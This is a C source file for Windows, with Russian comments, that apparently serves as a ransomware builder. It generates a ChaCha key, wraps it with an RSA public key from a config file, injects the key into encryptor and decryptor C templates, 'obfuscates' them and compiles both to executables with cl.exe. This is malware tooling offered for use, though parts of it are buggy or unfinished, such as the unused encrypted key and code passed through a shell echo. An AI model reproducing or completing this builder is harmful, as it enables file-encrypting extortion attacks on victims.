#include <windows.h>
#include <stdio.h>
#include "crypto.h"
#include "utils.h"
#include "config.h"

#define MAX_CODE_SIZE 1024 * 1024 // 1 МБ буфер для кода

// Читает файл в память
char* load_file(const char* filename) {
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hFile, NULL);
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, size + 1);
    DWORD bytesRead;
    ReadFile(hFile, buffer, size, &bytesRead, NULL);
    buffer[size] = '\0';
    CloseHandle(hFile);
    return buffer;
}

// Простая обфускация (перемешивание + мусор)
void obfuscate_code(char* code, const BYTE* chacha_key, const BYTE* encrypted_key) {
    // TODO: Добавить случайные NOP или бесполезные инструкции
    char key_str[256];
    sprintf_s(key_str, sizeof(key_str), "static BYTE chacha_key[32] = {%s};", format_bytes(chacha_key, 32));
    strcat_s(code, MAX_CODE_SIZE, key_str);
}

// Компиляция (упрощенно, используем cl.exe от MSVC)
void compile_to_exe(const char* code, const char* output) {
    char cmd[512];
    sprintf_s(cmd, sizeof(cmd), "echo %s > temp.c && cl.exe /O1 /Fe%s temp.c", code, output);
    system(cmd);
}

int main() {
    // Загружаем конфиг
    char* config_json = load_file("cfg.txt");
    if (!config_json) {
        printf("Error loading config\n");
        return 1;
    }
    Config config = parse_config(config_json);

    // Генерируем ключи
    BYTE chacha_key[32];
    BYTE nonce[12] = {0}; // Пока фиксированный, можно рандомизировать
    generate_random(chacha_key, 32);

    BYTE encrypted_key[256];
    rsa_encrypt(chacha_key, 32, encrypted_key, config.rsa_pub_key);

    // Загружаем шаблоны
    char* enc_template = load_file("src/encryptor.c");
    char* dec_template = load_file("src/decryptor.c");

    // Добавляем ключи и обфусцируем
    obfuscate_code(enc_template, chacha_key, encrypted_key);
    obfuscate_code(dec_template, chacha_key, encrypted_key);

    // Компилируем
    compile_to_exe(enc_template, "output/encryptor.exe");
    compile_to_exe(dec_template, "output/decryptor.exe");

    // Генерируем и выводим пароль
    char password[65];
    generate_password(password, 64);
    printf("Generated password: %s\n", password);

    // Очистка
    HeapFree(GetProcessHeap(), 0, config_json);
    HeapFree(GetProcessHeap(), 0, enc_template);
    HeapFree(GetProcessHeap(), 0, dec_template);
    free_config(&config);

    return 0;
}